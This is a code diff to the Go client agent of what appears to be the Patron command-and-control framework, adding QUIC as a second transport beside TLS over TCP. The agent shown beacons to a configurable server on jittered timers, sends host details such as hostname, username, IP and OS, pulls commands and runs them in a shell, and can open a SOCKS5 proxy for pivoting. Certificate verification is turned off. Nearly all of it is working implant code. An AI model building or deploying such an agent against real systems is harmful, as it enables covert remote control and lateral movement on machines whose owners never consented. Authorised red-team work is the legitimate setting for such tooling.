@@ -7,8 +7,8 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
-	"encoding/gob"
 	"fmt"
+	"io"
 	"math/rand"
 	"net"
 	"os/exec"
@@ -20,6 +20,7 @@ import (
 
 	"github.com/armon/go-socks5"
 	"github.com/google/uuid"
+	"github.com/quic-go/quic-go"
 
 	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
 	"github.com/PatronC2/Patron/client/client_utils/linux/linux_utils"
@@ -28,6 +29,22 @@ import (
 	"github.com/PatronC2/Patron/lib/logger"
 	"github.com/PatronC2/Patron/types"
 )
+
+type Config struct {
+	ServerIP          *string
+	ServerPort        *string
+	CallbackFrequency *string
+	CallbackJitter    *string
+	TransportProtocol *string
+}
+
+var ClientConfig = &Config{
+	ServerIP:          new(string),
+	ServerPort:        new(string),
+	CallbackFrequency: new(string),
+	CallbackJitter:    new(string),
+	TransportProtocol: new(string),
+}
 
 type ProxyServer struct {
 	server   *socks5.Server
@@ -51,7 +68,7 @@ func Initialize(logging_enabled string) {
 	}
 }
 
-func LoadCertificate(RootCert string) (*tls.Config, error) {
+func LoadCertificate(RootCert, transport string) (*tls.Config, error) {
 	publicKey, err := base64.StdEncoding.DecodeString(RootCert)
 	if err != nil {
 		return nil, err
@@ -60,7 +77,15 @@ func LoadCertificate(RootCert string) (*tls.Config, error) {
 	if !roots.AppendCertsFromPEM(publicKey) {
 		return nil, fmt.Errorf("failed to parse root certificate")
 	}
-	return &tls.Config{RootCAs: roots, InsecureSkipVerify: true}, nil
+	config := &tls.Config{
+		RootCAs:            roots,
+		InsecureSkipVerify: true,
+	}
+	if transport == "QUIC" {
+		config.NextProtos = []string{"quic-patron"}
+	}
+
+	return config, nil
 }
 
 func GenerateAgentMetadata() (string, string, string) {
@@ -101,47 +126,48 @@ func RunShellCommand(command string) string {
 	return string(output)
 }
 
-func EstablishConnection(config *tls.Config, ServerIP, ServerPort string) (*tls.Conn, error) {
-	var address string
-	if net.ParseIP(ServerIP).To4() == nil {
-		address = fmt.Sprintf("[%s]:%s", ServerIP, ServerPort)
-	} else {
-		address = fmt.Sprintf("%s:%s", ServerIP, ServerPort)
+func EstablishConnection(config *tls.Config, ServerIP, ServerPort, TransportProtocol string) (io.ReadWriteCloser, error) {
+	address := fmt.Sprintf("%s:%s", ServerIP, ServerPort)
+
+	switch TransportProtocol {
+	case "QUIC":
+		logger.Logf(logger.Info, "Dialing QUIC %v", address)
+		session, err := quic.DialAddr(context.Background(), address, config, nil)
+		if err != nil {
+			return nil, fmt.Errorf("QUIC dial failed: %w", err)
+		}
+		stream, err := session.OpenStreamSync(context.Background())
+		if err != nil {
+			return nil, fmt.Errorf("QUIC stream failed: %w", err)
+		}
+		return stream, nil
+
+	case "TCP":
+		logger.Logf(logger.Info, "Dialing TCP %v", address)
+		conn, err := tls.Dial("tcp", address, config)
+		if err != nil {
+			return nil, fmt.Errorf("TCP dial failed: %w", err)
+		}
+		return conn, nil
+
+	default:
+		return nil, fmt.Errorf("unsupported transport: %s", TransportProtocol)
 	}
+}
 
-	logger.Logf(logger.Info, "Dialing %v", address)
-
-	beacon, err := tls.Dial("tcp", address, config)
-	if err != nil {
-		logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
-		return nil, err
+func GetLocalIP(beacon io.ReadWriteCloser) string {
+	if conn, ok := beacon.(interface{ LocalAddr() net.Addr }); ok {
+		if tcpAddr, ok := conn.LocalAddr().(*net.TCPAddr); ok {
+			return tcpAddr.IP.String()
+		}
 	}
-	return beacon, nil
+	return "unknown"
 }
 
-func GetLocalIP(beacon *tls.Conn) string {
-	return beacon.LocalAddr().(*net.TCPAddr).IP.String()
-}
-
-func SendRequest(encoder *gob.Encoder, reqType types.RequestType, payload interface{}) error {
-	return encoder.Encode(types.Request{Type: reqType, Payload: payload})
-}
-
-func HandleError(beacon *tls.Conn, reqType string, err error) {
+func HandleError(beacon io.ReadWriteCloser, reqType string, err error) {
 	logger.Logf(logger.Error, "Error during %s request: %v", reqType, err)
 	beacon.Close()
 	time.Sleep(2 * time.Second)
-}
-
-func CalculateSleepInterval(CallbackFrequency string, CallbackJitter string) float64 {
-	// DEPRECATED - USE CalculateNextCallbackTime
-	r := rand.New(rand.NewSource(time.Now().UnixNano()))
-	frequency, _ := strconv.Atoi(CallbackFrequency)
-	jitter, _ := strconv.Atoi(CallbackJitter)
-	jitterPercent := float64(jitter) * 0.01
-	baseTime := float64(frequency)
-	variance := baseTime * jitterPercent * r.Float64()
-	return baseTime - (jitterPercent * baseTime) + 2*variance
 }
 
 func CalculateNextCallbackTime(callbackFrequency string, callbackJitter string) time.Time {
@@ -196,7 +222,7 @@ func SetActiveProxy(proxy *ProxyServer) {
 	activeProxy = proxy
 }
 
-func HandleSocksCommand(conn *tls.Conn, cmd *patronobuf.CommandResponse) error {
+func HandleSocksCommand(beacon io.ReadWriteCloser, cmd *patronobuf.CommandResponse) error {
 	if cmd.GetCommand() == "disable" {
 		if GetActiveProxy() != nil {
 			logger.Logf(logger.Info, "Disabling SOCKS5 proxy")
@@ -213,7 +239,7 @@ func HandleSocksCommand(conn *tls.Conn, cmd *patronobuf.CommandResponse) error {
 			Result:    "1",
 			Output:    "Stopped SOCKS5 Proxy",
 		}
-		return common.WriteDelimited(conn, &patronobuf.Request{
+		return common.WriteDelimited(beacon, &patronobuf.Request{
 			Type: patronobuf.RequestType_COMMAND_STATUS,
 			Payload: &patronobuf.Request_CommandStatus{
 				CommandStatus: status,
@@ -230,7 +256,7 @@ func HandleSocksCommand(conn *tls.Conn, cmd *patronobuf.CommandResponse) error {
 			Result:    "1",
 			Output:    "A SOCKS5 proxy is already running. Stop it before starting a new one.",
 		}
-		return common.WriteDelimited(conn, &patronobuf.Request{
+		return common.WriteDelimited(beacon, &patronobuf.Request{
 			Type: patronobuf.RequestType_COMMAND_STATUS,
 			Payload: &patronobuf.Request_CommandStatus{
 				CommandStatus: status,
@@ -248,7 +274,7 @@ func HandleSocksCommand(conn *tls.Conn, cmd *patronobuf.CommandResponse) error {
 			Result:    "1",
 			Output:    fmt.Sprintf("Invalid port number: %s. Port must be between 1 and 65535.", portStr),
 		}
-		return common.WriteDelimited(conn, &patronobuf.Request{
+		return common.WriteDelimited(beacon, &patronobuf.Request{
 			Type: patronobuf.RequestType_COMMAND_STATUS,
 			Payload: &patronobuf.Request_CommandStatus{
 				CommandStatus: status,
@@ -267,7 +293,7 @@ func HandleSocksCommand(conn *tls.Conn, cmd *patronobuf.CommandResponse) error {
 			Result:    "1",
 			Output:    fmt.Sprintf("Failed to create SOCKS5 proxy: %v", err),
 		}
-		return common.WriteDelimited(conn, &patronobuf.Request{
+		return common.WriteDelimited(beacon, &patronobuf.Request{
 			Type: patronobuf.RequestType_COMMAND_STATUS,
 			Payload: &patronobuf.Request_CommandStatus{
 				CommandStatus: status,
@@ -284,7 +310,7 @@ func HandleSocksCommand(conn *tls.Conn, cmd *patronobuf.CommandResponse) error {
 			Result:    "1",
 			Output:    fmt.Sprintf("Failed to start listener on port: %d: %v", port, err),
 		}
-		return common.WriteDelimited(conn, &patronobuf.Request{
+		return common.WriteDelimited(beacon, &patronobuf.Request{
 			Type: patronobuf.RequestType_COMMAND_STATUS,
 			Payload: &patronobuf.Request_CommandStatus{
 				CommandStatus: status,
@@ -317,7 +343,7 @@ func HandleSocksCommand(conn *tls.Conn, cmd *patronobuf.CommandResponse) error {
 		Result:    "1",
 		Output:    "Started SOCKS5 Proxy",
 	}
-	return common.WriteDelimited(conn, &patronobuf.Request{
+	return common.WriteDelimited(beacon, &patronobuf.Request{
 		Type: patronobuf.RequestType_COMMAND_STATUS,
 		Payload: &patronobuf.Request_CommandStatus{
 			CommandStatus: status,
@@ -333,7 +359,7 @@ func (p *ProxyServer) StopProxy() {
 	logger.Logf(logger.Info, "SOCKS5 proxy server stopped.")
 }
 
-func HandleConfigurationRequest(beacon net.Conn, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory, serverIP, serverPort, callbackFrequency, callbackJitter string, nextCallback time.Time) error {
+func HandleConfigurationRequest(beacon io.ReadWriteCloser, agentID, hostname, username, ip, osType, osArch, osVersion, cpus, memory, serverIP, serverPort, callbackFrequency, callbackJitter string, nextCallback time.Time, transportProtocol string) error {
 	req := &patronobuf.Request{
 		Type: patronobuf.RequestType_CONFIGURATION,
 		Payload: &patronobuf.Request_Configuration{
@@ -353,6 +379,7 @@ func HandleConfigurationRequest(beacon net.Conn, agentID, hostname, username, ip
 				Callbackjitter:    callbackJitter,
 				Masterkey:         "MASTERKEY",
 				NextcallbackUnix:  nextCallback.Unix(),
+				Transportprotocol: transportProtocol,
 			},
 		},
 	}
@@ -375,11 +402,11 @@ func HandleConfigurationRequest(beacon net.Conn, agentID, hostname, username, ip
 		return fmt.Errorf("missing configuration response payload")
 	}
 
-	UpdateClientConfig(conf, serverIP, serverPort, callbackFrequency, callbackJitter)
+	UpdateClientConfig(conf, serverIP, serverPort, callbackFrequency, callbackJitter, transportProtocol)
 	return nil
 }
 
-func CreateConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip, ServerIP, ServerPort, CallbackFrequency, CallbackJitter string, nextCallback time.Time) types.ConfigurationRequest {
+func CreateConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cpus, memory, username, ip, ServerIP, ServerPort, CallbackFrequency, CallbackJitter string, nextCallback time.Time, transportProtocol string) types.ConfigurationRequest {
 	return types.ConfigurationRequest{
 		AgentID:           agentID,
 		Username:          username,
@@ -396,14 +423,16 @@ func CreateConfigurationRequest(agentID, hostname, osType, osArch, osVersion, cp
 		CallbackJitter:    CallbackJitter,
 		NextCallback:      nextCallback,
 		MasterKey:         "MASTERKEY",
+		TransportProtocol: transportProtocol,
 	}
 }
 
-func UpdateClientConfig(config *patronobuf.ConfigurationResponse, serverIP, serverPort, callbackFrequency, callbackJitter string) {
-	UpdateConfigField(&serverIP, config.GetServerip(), "callback IP")
-	UpdateConfigField(&serverPort, config.GetServerport(), "callback port")
-	UpdateConfigField(&callbackFrequency, config.GetCallbackfrequency(), "callback frequency")
-	UpdateConfigField(&callbackJitter, config.GetCallbackjitter(), "callback jitter")
+func UpdateClientConfig(config *patronobuf.ConfigurationResponse, serverIP, serverPort, callbackFrequency, callbackJitter, transportProtocol string) {
+	UpdateConfigField(ClientConfig.ServerIP, config.GetServerip(), "callback IP")
+	UpdateConfigField(ClientConfig.ServerPort, config.GetServerport(), "callback port")
+	UpdateConfigField(ClientConfig.CallbackFrequency, config.GetCallbackfrequency(), "callback frequency")
+	UpdateConfigField(ClientConfig.CallbackJitter, config.GetCallbackjitter(), "callback jitter")
+	UpdateConfigField(ClientConfig.TransportProtocol, config.GetTransportprotocol(), "transport protocol")
 }
 
 func UpdateConfigField(current *string, new, fieldName string) {
@@ -413,7 +442,7 @@ func UpdateConfigField(current *string, new, fieldName string) {
 	}
 }
 
-func HandleCommandRequest(conn *tls.Conn, agentID string) error {
+func HandleCommandRequest(beacon io.ReadWriteCloser, agentID string) error {
 	logger.Logf(logger.Info, "Fetching commands to run")
 
 	for {
@@ -424,12 +453,12 @@ func HandleCommandRequest(conn *tls.Conn, agentID string) error {
 			},
 		}
 
-		if err := common.WriteDelimited(conn, req); err != nil {
+		if err := common.WriteDelimited(beacon, req); err != nil {
 			return fmt.Errorf("send command request: %w", err)
 		}
 
 		resp := &patronobuf.Response{}
-		if err := common.ReadDelimited(conn, resp); err != nil {
+		if err := common.ReadDelimited(beacon, resp); err != nil {
 			return fmt.Errorf("read command response: %w", err)
 		}
 
@@ -441,7 +470,7 @@ func HandleCommandRequest(conn *tls.Conn, agentID string) error {
 		logger.Logf(logger.Debug, "commandType: %v", cmd.Commandtype)
 
 		if cmd.GetCommandtype() == "socks" {
-			if err := HandleSocksCommand(conn, cmd); err != nil {
+			if err := HandleSocksCommand(beacon, cmd); err != nil {
 				return fmt.Errorf("handle SOCKS5 command: %w", err)
 			}
 			continue
@@ -461,12 +490,12 @@ func HandleCommandRequest(conn *tls.Conn, agentID string) error {
 			},
 		}
 
-		if err := common.WriteDelimited(conn, statusReq); err != nil {
+		if err := common.WriteDelimited(beacon, statusReq); err != nil {
 			return fmt.Errorf("send command status: %w", err)
 		}
 
 		ack := &patronobuf.Response{}
-		if err := common.ReadDelimited(conn, ack); err != nil {
+		if err := common.ReadDelimited(beacon, ack); err != nil {
 			return fmt.Errorf("read command ack: %w", err)
 		}
 
